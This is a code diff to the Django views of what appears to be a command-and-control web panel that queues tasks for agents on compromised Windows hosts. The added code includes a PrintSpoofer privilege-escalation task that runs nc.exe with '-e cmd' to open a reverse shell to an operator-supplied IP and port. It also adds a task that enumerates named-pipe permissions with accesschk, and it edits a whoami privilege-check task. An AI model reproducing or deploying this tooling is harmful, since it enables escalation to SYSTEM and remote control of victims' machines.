@@ -59,6 +59,7 @@ def Download(request):
             f.write(task)
             f.close()
         return JsonResponse({},status=200)
+
     else:
         return render(request, 'blog/listeners.html')
 
@@ -212,7 +213,7 @@ def winuser_info(request):
         moduleId = request.POST['moduleId']
         agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
         agentTask.save()
-        task = 'echo "===============Current_user===============";whoami;echo "===============User_Privileges===============";echo "If the user has SeImpersonate or SeAssignPrimaryToken privileges then you are SYSTEM USE JuicyPotato of PrintSpoofer or RougePotato.";whoami /priv;echo "===============User_group_information===============";whoami /groups'
+        task = 'echo "===============Current_user===============";whoami;echo "===============User_Privileges==============="; whoami /priv;echo "===============User_group_information===============";whoami /groups'
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
             f.write(task)
@@ -313,7 +314,23 @@ def Named_pipes(request):
         return JsonResponse({},status=200)
     else:
         return render(request, 'blog/listeners.html')
-    
+
+def Perm_pip(request , agent='',named_pip_name=''):
+    if request.method=='POST':
+        agent = request.POST['agent']
+        agentId = request.POST['agentId']
+        moduleId = request.POST['moduleId']
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
+        agentTask.save()
+        task = 'echo "===============Review permissions on a named pipe===============";cmd;accesschk.exe /accepteula \\.\Pipe\{} -v'.format(named_pip_name)
+        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
+        with open(task_path, "w") as f:
+            f.write(task)
+            f.close()
+        return JsonResponse({},status=200)
+    else:
+        return render(request, 'blog/listeners.html')
+       
 
 def juicypotato (request):
     if request.method=='POST':
@@ -334,3 +351,24 @@ def juicypotato (request):
     else:
         return render(request, 'blog/listeners.html')
     
+
+
+def printspoofer (request):
+    if request.method=='POST':
+        myip = request.POST['myip']
+        agent = request.POST['agent']
+        agentId = request.POST['agentId']
+        moduleId = request.POST['moduleId']
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
+        agentTask.save()
+        listenport = request.POST['listenport']    
+        pathOfSpooferOnVictim = request.POST['pathOfSpooferOnVictim']
+        task = '{} -c "c:\tools\nc.exe {} {} -e cmd"'.format(pathOfSpooferOnVictim,myip,listenport)
+        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
+        with open(task_path, "w") as f:
+            f.write(task)
+            f.close()
+        return JsonResponse({},status=200)
+    else:
+        return render(request, 'blog/listeners.html')
+
